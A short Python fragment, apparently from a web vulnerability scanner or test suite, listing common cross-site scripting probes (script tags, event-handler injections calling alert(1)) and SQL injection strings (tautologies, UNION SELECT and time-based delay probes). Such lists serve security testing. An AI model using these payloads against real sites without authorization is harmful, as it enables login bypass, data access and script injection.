
XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '" onmouseover="alert(1)"',
    "'><svg onload=alert(1)>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert(1)",
    "<body onload=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "<marquee onstart=alert(1)>",
    "<video src=x onerror=alert(1)>",
    "-alert(1)-",
]

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1 -- ",
    "\" OR \"1\"=\"1",
    "1' OR '1'='1' --",
    "1 OR 1=1",
    "'; WAITFOR DELAY '0:0:3' --",
    "' UNION SELECT NULL -- ",
    "' AND 1=0 UNION SELECT NULL, NULL, NULL --",
    "1' AND SLEEP(2) --",
    "admin'--",
    "' OR ''='",
]
